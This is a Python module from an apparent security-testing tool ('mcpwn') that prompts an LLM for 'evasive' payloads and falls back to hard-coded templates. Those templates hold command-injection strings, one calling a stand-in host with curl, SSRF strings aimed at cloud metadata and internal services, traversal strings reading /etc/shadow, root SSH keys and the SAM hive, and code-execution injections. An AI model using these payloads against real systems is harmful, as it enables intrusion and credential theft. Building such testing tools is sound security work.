"""LLM-guided payload generation for adaptive security testing."""

import json
import logging
from typing import Dict, List

logger = logging.getLogger('mcpwn')


class LLMPayloadGenerator:
    """Context-aware payload synthesis using LLM intelligence."""
    
    def __init__(self, config: Dict):
        self.config = config
        self.enabled = config.get('generation_mode', False)
        logger.info(f"LLM Generator initialized (enabled={self.enabled})")
    
    def generate(self, context: Dict) -> List[str]:
        """
        Synthesize novel payloads based on context.
        
        Args:
            context: {
                'tool_name': str,
                'previous_failure': str,
                'schema_hints': dict,
                'target_type': str  # 'rce', 'ssrf', 'traversal', etc.
            }
        
        Returns:
            List of generated payload strings
        """
        if not self.enabled:
            return []
        
        tool_name = context.get('tool_name', 'unknown')
        target_type = context.get('target_type', 'generic')
        failure = context.get('previous_failure', 'None')
        
        # Construct context-aware prompt
        prompt = self._build_prompt(tool_name, target_type, failure)
        
        # Generate payloads (simulated - replace with actual LLM call)
        payloads = self._simulate_generation(tool_name, target_type, prompt)
        
        logger.info(f"Generated {len(payloads)} payloads for {tool_name} ({target_type})")
        return payloads
    
    def _build_prompt(self, tool_name: str, target_type: str, failure: str) -> str:
        """Construct LLM prompt with security testing context."""
        return (
            f"Generate 5 evasive {target_type} payloads for tool '{tool_name}'. "
            f"Previous attempt: {failure}. Output JSON array of strings only."
        )
    
    def _simulate_generation(self, tool_name: str, target_type: str, prompt: str) -> List[str]:
        """Simulated LLM response - replace with actual API call."""
        seed = hash(prompt) % 1000
        
        templates = {
            'rce': [
                f"$(id>{seed})",
                f"`whoami|base64`",
                f"${{IFS}}cat${{{seed}}}",
                f";curl http://evil.com/{seed}",
                f"&&echo$IFS$9{seed}"
            ],
            'ssrf': [
                f"http://169.254.169.254/latest/meta-data/{seed}",
                f"file:///proc/self/environ",
                f"http://localhost:6379/SET{seed}",
                f"gopher://127.0.0.1:25/_{seed}",
                f"dict://localhost:11211/stat"
            ],
            'traversal': [
                f"....//....//etc/passwd",
                f"..%252f..%252f..%252fetc/shadow",
                f"..;/..;/..;/root/.ssh/id_rsa",
                f"/proc/self/cwd/../../../etc/hosts",
                f"\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
            ],
            'schema_pollution': [
                f"__proto__[polluted_{seed}]=1",
                f"constructor.prototype.{seed}=true",
                f"__class__.__init__.__globals__[os].system('id')",
                f"{{__import__('os').system('{seed}')}}"
            ]
        }
        
        return templates.get(target_type, [f"GEN_{tool_name}_{i}" for i in range(3)])


# Global instance
_GENERATOR = None

def initialize_generator(config: Dict) -> LLMPayloadGenerator:
    """Initialize global generator instance."""
    global _GENERATOR
    _GENERATOR = LLMPayloadGenerator(config)
    return _GENERATOR

def get_generator() -> LLMPayloadGenerator:
    """Access global generator instance."""
    return _GENERATOR
